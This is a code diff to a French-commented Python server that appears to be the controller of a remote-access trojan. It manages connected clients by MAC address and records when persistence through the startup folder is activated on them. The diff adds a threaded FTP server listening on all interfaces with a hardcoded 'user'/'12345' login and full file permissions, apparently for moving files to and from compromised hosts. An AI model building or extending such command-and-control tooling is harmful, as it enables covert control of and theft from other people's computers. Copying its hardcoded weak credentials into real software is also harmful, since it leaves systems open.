@@ -9,6 +9,13 @@ import json
 import http.server
 import socketserver
 import argparse
+from pyftpdlib.authorizers import DummyAuthorizer
+from pyftpdlib import servers
+from pyftpdlib.handlers import FTPHandler
+try:
+    import logging
+except:
+    print("Erreur de l'importation de loggin essayer : pip install logging")
 
 tid_clients = {}
 pathDb = "./clients/"
@@ -28,7 +35,7 @@ parser.add_argument('--host',
                     type=str, 
                     required=False, 
                     dest='host',
-                    default="",
+                    default="0.0.0.0",
                     help='Ip d\'ecoute du seveur (defaut : Any)')
 parser.add_argument('--port', 
                     type=int, 
@@ -83,10 +90,15 @@ class Threads:
             thread = threading.Thread(target=s.StartHttp, name=fonction)
             thread.start()
 
+        if "StartFtp" in fonction:
+            thread = threading.Thread(target=s.StartFtp, name=fonction)
+            thread.start()
+
         if "Client" in fonction:
             thread = threading.Thread(target=s.Threaded_client, name=fonction, args=(arg1, arg2, arg3))
             thread.start()
             tid_clients[arg3] = thread.ident
+
         self.thread_id = thread.ident
         self.thread_name = thread.name
     
@@ -337,7 +349,10 @@ class Server:
                                         self.current_sessions = 0
                                         exit = True
                                         break
-                                    results, pwd = output.split(self.SEPARATOR)
+                                    try:
+                                        results, pwd = output.split(self.SEPARATOR)
+                                    except:
+                                        results = "Les Données recu sont surrement trop grosse"
                                     if "Persistance via dossier startup activé" in results:
                                         print("Persistance correctement activé")
                                         DefinirPersistance(mac_address, "ON")
@@ -390,6 +405,20 @@ class Server:
             print("Port d'écoute web : ", PORT)
             httpd.serve_forever()
 
+    def StartFtp(self):
+        ADDR = self.host
+        PORT = (self.port + 2)
+        DIRECTORY = "./ftp"
+        authorizer = DummyAuthorizer()
+        authorizer.add_user("user", "12345", DIRECTORY,  perm="elradfmw")
+        address = (ADDR, PORT)  # listen on every IP on my machine on port 21
+        handler = FTPHandler
+        handler.authorizer = authorizer
+        logging.basicConfig(filename='pyftpd.log', level=logging.INFO)
+        server = servers.FTPServer(address, handler)
+        print("Port d'écoute FTP : ", PORT)
+        server.serve_forever()
+
 
     def LaunchThread(self, fonction, arg1 = "", arg2 = "", arg3 = ""):
         #print(fonction)
@@ -408,10 +437,12 @@ s = Server()
 
 listen_service = s.LaunchThread("Run")
 http_service = s.LaunchThread("StartHttp")
+ftp_service = s.LaunchThread("StartFtp")
 time.sleep(1)
 s.Prompt()
 listen_service.StopThread()
 http_service.StopThread()
+ftp_service.StopThread()
 #StopAllClients()
 #p.StopThread()
 os._exit(0)
